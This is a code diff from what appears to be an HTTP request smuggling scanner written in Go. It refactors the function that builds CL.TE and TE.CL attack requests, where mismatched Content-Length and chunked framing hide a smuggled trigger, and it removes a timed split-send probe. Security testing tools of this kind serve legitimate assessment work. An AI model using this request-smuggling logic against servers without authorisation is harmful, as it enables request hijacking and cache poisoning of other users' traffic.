@@ -18,11 +18,9 @@ import (
 	"fmt"
 	"net/url"
 	"strings"
-	"time"
 
 	"github.com/smuggled/smuggled/pkg/permute"
 	"github.com/smuggled/smuggled/pkg/report"
-	"github.com/smuggled/smuggled/pkg/transport"
 )
 
 var h1TunnelMethods = []string{"HEAD", "POST", "GET", "OPTIONS"}
@@ -134,13 +132,11 @@ func buildH1TunnelBase(method, path, host string) []byte {
 // buildH1TunnelAttack wraps the trigger as a CL.TE (clte=true) or TE.CL attack.
 func buildH1TunnelAttack(base []byte, trigger string, clte bool) []byte {
 	if clte {
-		// CL.TE: CL = trigger length, body = chunked 0-terminator + trigger
-		body := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(trigger), trigger[:len(trigger)-2]) // strip trailing \r\n from trigger before chunk
-		body = "0\r\n\r\n" + trigger
-		req := setBody(base, body)
-		return setContentLength(req, len(trigger))
+		// CL.TE: 0-terminated chunk + raw trigger as smuggled suffix
+		body := "0\r\n\r\n" + trigger
+		return setContentLength(setBody(base, body), len(trigger))
 	}
-	// TE.CL: chunk promises more than we send, CL points before terminator
+	// TE.CL: chunk promises more than we send; CL points before the data
 	chunkBody := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(trigger), trigger)
 	cl := len(fmt.Sprintf("%x\r\n", len(trigger)))
 	req := setBody(base, chunkBody)
@@ -163,25 +159,4 @@ func hasNestedHTTPResponse(resp []byte) bool {
 // applyTEOrSkip applies a TE permutation and returns nil if no effect.
 func applyTEOrSkip(req []byte, tech string) []byte {
 	return permute.ApplyTE(req, tech)
-}
-
-// pauseProbe sends the first `pauseAt` bytes, waits `pause`, then the rest.
-// Returns the response bytes, elapsed time, and whether a timeout occurred.
-func pauseProbe(target *url.URL, payload []byte, pauseAt int, pause time.Duration, cfg Config) ([]byte, time.Duration, bool) {
-	conn, err := transport.Dial(target, cfg.Timeout, cfg.Proxy, cfg.SkipTLSVerify)
-	if err != nil {
-		return nil, 0, false
-	}
-	defer conn.Close()
-
-	// Send first part
-	if err := conn.Send(payload[:pauseAt]); err != nil {
-		return nil, 0, false
-	}
-	time.Sleep(pause)
-	// Send rest
-	conn.Send(payload[pauseAt:]) //nolint:errcheck
-
-	data, dur, timedOut := conn.RecvWithTimeout(cfg.Timeout)
-	return data, dur, timedOut
 }
